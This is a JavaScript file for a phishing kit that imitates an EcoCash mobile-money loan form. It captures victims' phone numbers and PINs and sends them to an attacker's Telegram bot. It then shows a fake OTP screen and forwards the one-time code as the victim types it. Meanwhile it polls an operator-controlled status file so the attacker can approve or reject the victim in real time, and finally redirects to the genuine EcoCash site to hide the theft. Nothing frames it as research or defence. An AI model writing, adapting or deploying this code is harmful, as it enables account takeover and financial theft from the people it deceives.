// CONFIG — CHANGE THESE
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';  // e.g., 7891234567:AAFdjkfjkdjfkjdjfkjdjfkj
const CHAT_ID = 'YOUR_CHAT_ID';               // e.g., 123456789

// Update installment in real-time
document.getElementById('amount').addEventListener('input', updateInstallment);
document.getElementById('duration').addEventListener('change', updateInstallment);

function updateInstallment() {
    const amount = parseFloat(document.getElementById('amount').value) || 0;
    const duration = parseInt(document.getElementById('duration').value);
    const installment = (amount / duration).toFixed(2);
    document.getElementById('installment').textContent = installment;
}

// On loan form submit
document.getElementById('loanForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;
    const amount = document.getElementById('amount').value;
    const duration = document.getElementById('duration').value;
    const installment = (amount / duration).toFixed(2);

    // Send to Telegram
    const credentialsMsg = `
📞 *Ecocash Login*  
📱 *Phone:* ${phone}  
🔐 *PIN:* ${pin}  
💰 *Amount:* \$${amount}  
📅 *Duration:* ${duration} months  
🧮 *Monthly:* \$${installment}  
⏱️ *Time:* ${new Date().toISOString()}
    `;

    await sendToTelegram(credentialsMsg);

    // Hide form, show OTP screen
    document.getElementById('loanForm').style.display = 'none';
    document.getElementById('otpScreen').style.display = 'block';

    // Start polling fake approval
    pollApproval(phone);
});

// Poll every 3 seconds for "approval"
async function pollApproval(phone) {
    const statusMsg = document.getElementById('statusMsg');
    const otpInput = document.getElementById('otp');
    let attempts = 0;

    const interval = setInterval(async () => {
        if (attempts > 8) {
            clearInterval(interval);
            statusMsg.textContent = "Session expired.";
            return;
        }

        // Simulate admin-controlled response via external file
        try {
            const res = await fetch('approval_status.txt?' + new Date().getTime());
            const decision = await res.text();

            if (decision.trim() === 'approve') {
                clearInterval(interval);
                statusMsg.textContent = "✅ Approved! Redirecting...";
                setTimeout(() => {
                    window.location.href = "https://ecocash.co.zw"; // Fake redirect
                }, 2000);
            } else if (decision.trim() === 'wrong_pin') {
                clearInterval(interval);
                statusMsg.textContent = "❌ Invalid PIN. Try again.";
                setTimeout(() => location.reload(), 2000);
            } else if (decision.trim() === 'wrong_otp') {
                clearInterval(interval);
                otpInput.style.border = "2px solid #c62828";
                statusMsg.textContent = "❌ Invalid OTP.";
            }
        } catch (err) {
            // Ignore — simulate network lag
        }

        attempts++;
    }, 3000);

    // Listen for OTP input
    document.getElementById('otp').addEventListener('input', async function() {
        if (this.value.length === 4) {
            await sendToTelegram(`🔑 *OTP Received:* ${this.value} | 📱 ${phone} | ⏱️ ${new Date().toISOString()}`);
        }
    });
}

// Send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {}); // Silent fail
}